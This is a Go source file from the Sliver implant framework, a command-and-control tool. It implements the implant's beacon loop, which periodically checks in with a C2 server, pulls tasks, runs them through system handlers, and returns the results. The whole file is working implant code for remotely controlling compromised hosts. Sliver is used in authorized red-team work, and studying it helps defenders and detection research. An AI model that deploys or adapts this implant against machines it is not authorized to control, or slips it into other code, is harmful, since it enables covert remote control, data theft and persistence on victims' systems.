package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"sync"
	"time"

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Beacon - A Beacon is a slightly more evolved type of Channel, but only so: under the hood,
// a beacon is continually spawning Session types, communicates over them with the server for
// a brief period, and cleans everything up.
type Beacon struct {
	*transports.Driver               // Base
	*sync.WaitGroup                  // Manage when beaconing runs are over
	mutex              *sync.RWMutex // Need to update fields between potentially simultaneous runs.
	closed             chan struct{} // Notify the beaconing loop goroutine we're closed
}

// NewBeacon - Instantiate a new Beacon type, for beacon-style communication with the server.
func NewBeacon(t *transports.Driver) (b *Beacon) {
	b = &Beacon{
		Driver:    t,                      // Base methods and C2 profile information
		WaitGroup: &sync.WaitGroup{},      // Concurrency
		mutex:     &sync.RWMutex{},        // Concurrency
		closed:    make(chan struct{}, 1), // Notify ourselves we're closed
	}
	return
}

// Start - Start the complete C2 stack for the first time (actually
// sets up a Session) over which we will register this beacon. The returned
// connection is used to send a registration message, or any other use.
func (b *Beacon) Start() (err error) {
	// {{if .Config.Debug}}
	log.Printf("Running in Beacon mode (Transport ID: %s)", b.ID)
	// {{end}}

	// The transport is not closed anymore, if it was
	b.closed = make(chan struct{}, 1)

	// Make a copy of our own driver by instantiating a new one.
	// This driver is the sole one in charge for this beaconing.
	driver, err := transports.NewTransportFromExisting(b.Driver)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error creating beaconing transport driver: %s", err)
		// {{end}}
		b.FailedAttempt()
		return
	}

	// Instantiate a new Session around this transport driver.
	session := NewSession(driver)
	defer b.RefreshStatistics(session.Driver)

	// We're now ready to start the Session per-se.
	err = session.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting beaconing session: %s", err)
		// {{end}}
		return
	}
	session.Close()

	return
}

// Serve - Slightly different from a Session.Serve() method: here the beacon
// will enter into a loop in which it does beaconing open/task/close runs, until
// exhausted with errors. This loop works according to the C2 Profile specifications.
// The error channel is passed by the caller so that he can monitor for error-caused
// closures of this transport, for automatic fallback purposes.
func (b *Beacon) Serve(errs chan error) {

LOOP:
	for {
		// Get a new duration for this coming beaconing.
		duration := b.Duration()

		// {{if .Config.Debug}}
		log.Printf("[beacon] sleep until %v", time.Now().Add(duration))
		// {{end}}

		// Wait until either...
		select {

		// ... The transport has been shutdown by a user
		case <-b.closed:
			b.Wait()               // Wait for all beaconing runs to complete
			b.closed <- struct{}{} // And acklowledge we're closed
			break LOOP

		// ... The beaconing interval has elapsed
		case <-time.After(duration):
		}

		// Only exit when we have reached the maximum number
		// of connection failures for this precise beaconing
		// Warn the transports that we are exhausted.
		// Note that this might fail even before the first beaconing
		// run: when attempting to connect. But if that was the case
		// we would not get to that point anyway.
		if _, failures := b.Statistics(); failures == int(b.MaxConnectionErrors) {
			// {{if .Config.Debug}}
			log.Printf("Failures: %d", failures)
			// {{end}}
			Transports.transportErrors <- ErrMaxAttempts
			return
		}

		// Run a beaconing process (connect, set up RPC, process tasks)
		// In the background so that if tasks do not complete, does not
		// block any next runs and their associated tasks.
		go b.BeaconOnce(duration)

	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] Exiting beaconing loop")
	// {{end}}
}

// BeaconOnce - Starts the complete C2 stack (creates a Session), checkin with the server,
// receive any pending task, executes them and wait until done, sends results and closes the stack.
func (b *Beacon) BeaconOnce(duration time.Duration) (err error) {

	// Notify a routine is owning the underlying connection stack, no one
	// should either restart it or shut any of its components down.
	b.Add(1)
	defer b.Done()

	// Make a copy of our own driver by instantiating a new one,
	// also transfering attempts, failures, etc, so that this child
	// driver will not overflow on the number of maximum attempts.
	// This driver is the sole one in charge for this beaconing.
	driver, err := transports.NewTransportFromExisting(b.Driver)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error creating beaconing transport driver: %s", err)
		// {{end}}
		b.FailedAttempt()
		return
	}

	// Instantiate a new Session around this transport driver:
	// this provides with either/and/or the TLV ReadWriter system,
	// and any session-based C2 channel.
	session := NewSession(driver)
	defer b.RefreshStatistics(session.Driver)

	// We're now ready to start the Session per-se, which can be ranging from
	// simply wrapping an underlying net.Conn with a TLV ReadWriter on top, or
	// implement a complete session in the original technical meaning, when the
	// C2 Channel is based on HTTP or DNS.
	err = session.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting beaconing session: %s", err)
		// {{end}}
		return
	}
	defer session.Close()

	// {{if .Config.Debug}}
	log.Printf("[beacon] sending check in ...")
	// {{end}}
	nextCheckin := time.Now().Add(duration)
	session.Send(transports.Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
		ID:          transports.BeaconID,
		NextCheckin: nextCheckin.UTC().Unix(),
	}))

	// At this point, we don't increase the number of failed attempts, because the issue
	// is clearly not a connectivity issue (the whole C2 stack is set up and should be fine)

	// {{if .Config.Debug}}
	log.Printf("[beacon] recv task(s) ...")
	// {{end}}
	envelope, err := session.Connection.Receive()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] recv failure %s", err)
		// {{end}}
		return
	}
	tasks := &pb.BeaconTasks{}
	err = proto.Unmarshal(envelope.Data, tasks)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] unmarshal failure %s", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] received %d task(s) from server", len(tasks.Tasks))
	// {{end}}
	if len(tasks.Tasks) == 0 {
		return
	}

	// Start executing all tasks concurrently, and wait until they complete.
	results := b.ExecuteTasks(tasks.Tasks)

	// {{if .Config.Debug}}
	log.Printf("[beacon] all tasks completed, sending results to server")
	// {{end}}

	// Send the results back to the server: the underlying connection stack
	// will not be closed until the beacon has tried to write them to it.
	session.Send(transports.Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
		ID:    transports.BeaconID,
		Tasks: results,
	}))

	// {{if .Config.Debug}}
	log.Printf("[beacon] all results sent to server, cleanup ...")
	// {{end}}
	return
}

// ExecuteTasks - Concurrently performs all the tasks in a request and
// populate the results. This blocks until all goroutines have finished.
func (b *Beacon) ExecuteTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
	wg := &sync.WaitGroup{}
	resultsMutex := &sync.Mutex{}

	// Register commands compatible with beacons.
	sysHandlers := handlers.GetSystemHandlers()

	for _, task := range tasks {
		// {{if .Config.Debug}}
		log.Printf("[beacon] execute task #%d", task.ID)
		log.Printf("         Type          %d", task.Type)
		// {{end}}
		if handler, ok := sysHandlers[task.Type]; ok {
			wg.Add(1)
			data := task.Data
			taskID := task.ID
			go handler(data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[beacon] handler function returned an error: %s", err)
				}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				results = append(results, &pb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
		} else if handler, ok := transportHandlers[task.Type]; ok {
			wg.Add(1)
			data := task.Data
			taskID := task.ID
			go handler(data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[beacon] handler function returned an error: %s", err)
				}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				results = append(results, &pb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
		} else {
			resultsMutex.Lock()
			results = append(results, &pb.Envelope{
				ID:                 task.ID,
				UnknownMessageType: true,
			})
			resultsMutex.Unlock()
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] waiting for task(s) to complete ...")
	// {{end}}
	wg.Wait()

	return
}

// Send - Again, the beacon's Send() method is a bit more complicated than Sessions':
// it starts a complete protocol stack and a Session on top, write the message and exits.
func (b *Beacon) Send(req *pb.Envelope) (err error) {

	// Make a copy of our own driver by instantiating a new one.
	// This driver is the sole one in charge for this beaconing.
	driver, err := transports.NewTransportFromExisting(b.Driver)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error creating beaconing transport driver: %s", err)
		// {{end}}
		b.FailedAttempt()
		return
	}
	// At the end of the run, update our own driver with
	// attempt/failures from the copy, beaconing one.

	// Instantiate a new Session around this transport driver.
	session := NewSession(driver)
	defer b.RefreshStatistics(session.Driver)

	// We're now ready to start the Session per-se.
	err = session.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting beaconing session: %s", err)
		// {{end}}
		return
	}
	defer session.Close()

	// Write the envelope to the connection
	session.Send(req)

	return
}

// Close - Notifies the beacon serve goroutine that we must close, so no more runs.
// This waits until this beaconing routine acklowledges our notice, and exits.
func (b *Beacon) Close() (err error) {
	b.closed <- struct{}{}
	<-b.closed // wait for it to confirm
	return
}

// RefreshStatistics - Because a beacon Channel instantiates a new driver & transport
// stack at each beacon checkin, we need to pass its statistics back to the caller, so
// we can still abide with the Profile attempts/failures specifications.
// The returned error is mainly used to signal we have reached our maximum.
func (b *Beacon) RefreshStatistics(child *transports.Driver) (err error) {
	b.mutex.RLock()
	defer b.mutex.RUnlock()
	b.NewAttempt() // Equivalent of the NewAttempt() call in driver Connect()

	// We only consider failures, as we have a new attempt added
	// each time the driver starts, and automatically counted.
	_, childFailures := child.Statistics()
	_, parentFailures := b.Statistics()

	// Increase our counter of failures for the last beacon checkin
	for i := 0; i < (childFailures - parentFailures); i++ {
		b.FailedAttempt()
	}

	_, parentFailures = b.Statistics()
	_, childFailures = child.Statistics()
	return
}
